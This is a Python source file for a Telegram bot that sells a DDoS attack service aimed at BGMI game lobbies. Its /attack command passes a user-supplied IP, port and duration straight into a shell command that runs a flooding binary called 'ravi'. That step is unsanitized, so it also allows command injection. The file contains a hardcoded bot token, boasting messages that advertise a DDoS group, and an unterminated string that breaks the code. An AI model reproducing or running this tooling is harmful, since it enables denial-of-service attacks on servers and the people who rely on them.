import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

TELEGRAM_BOT_TOKEN = '7994396340:AAFdhqJcH0YMH-AXAcblMj2OEbNrQAg6b2c'
ADMIN_USER_ID = 1885926472
USERS_FILE = 'users.txt'
attack_in_progress = False

def load_users():
    try:
        with open(USERS_FILE) as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        f.writelines(f"{user}\n" for user in users)

users = load_users()

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 𝙩𝙝𝙚 𝙗𝙜𝙢𝙞 𝙙𝙙𝙤𝙨 𝙜𝙧𝙤𝙪𝙥 🔥*\n\n"
        "*𝙐𝙨𝙚 /attack <𝙞𝙥> <𝙥𝙤𝙧𝙩> <𝙙𝙪𝙧𝙖𝙩𝙞𝙤𝙣>*\n"
        "*𝙇𝙚𝙩'𝙨 𝙎𝙩𝙖𝙧𝙩 𝙁𝙪𝙘𝙠𝙞𝙣𝙜 ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def manage(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need admin approval to use this command.*", parse_mode='Markdown')
        return

    if len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /manage <add|rem> <user_id>*", parse_mode='Markdown')
        return

    command, target_user_id = args
    target_user_id = target_user_id.strip()

    if command == 'add':
        users.add(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✔️ User {target_user_id} added.*", parse_mode='Markdown')
    elif command == 'rem':
        users.discard(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✔️ User {target_user_id} removed.*", parse_mode='Markdown')

async def run_attack(chat_id, ip, port, duration, context):
    global attack_in_progress
    attack_in_progress = True

    try:
        process = await asyncio.create_subprocess_shell(
            f"./ravi {ip} {port} {duration} 900",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        attack_in_progress = False
        await context.bot.send_message(chat_id=chat_id, text="*✅ 𝘼𝙩𝙩𝙖𝙘𝙠 𝙘𝙤𝙢𝙥𝙡𝙚𝙩𝙚𝙙! ✅*\n*𝙏𝙝𝙖𝙣𝙠 𝙮𝙤𝙪 𝙛𝙤𝙧 𝙪𝙨𝙞𝙣𝙜 𝙤𝙪𝙧 𝙨𝙚𝙧𝙫𝙞𝙘𝙚!*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress

    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    if user_id not in users:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need to be approved to use this bot.*", parse_mode='Markdown')
        return

    if attack_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ 𝘼𝙣𝙤𝙩𝙝𝙚𝙧 𝙖𝙩𝙩𝙖𝙘𝙠 𝙞𝙨 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙞𝙣 𝙥𝙧𝙤𝙜𝙧𝙚𝙨𝙨. 𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩.*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args
    await context.bot.send_message(chat_id=chat_id, text=(
        f"*⚔️ 𝘼𝙩𝙩𝙖𝙘𝙠 𝙡𝙖𝙪𝙣𝙘𝙝𝙚𝙙! ⚔️*\n"
        f"*🎯 𝙏𝙖𝙧𝙜𝙚𝙩: {ip}:{port}*\n"
        f"*🕒 𝘿𝙪𝙧𝙖𝙩𝙞𝙤𝙣: {duration} seconds*\n"
        f"*🔥 𝙀𝙣𝙟𝙤𝙮 𝙖𝙣𝙙 𝙛𝙪𝙘𝙠 𝙬𝙝𝙤𝙡𝙚 𝙡𝙤𝙗𝙗𝙮  💥*\n
        f"*✅𝙅𝙊𝙄𝙉 :- MAFIADDOS*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("manage", manage))
    application.add_handler(CommandHandler("attack", attack))
    application.run_polling()

if __name__ == '__main__':
    main()

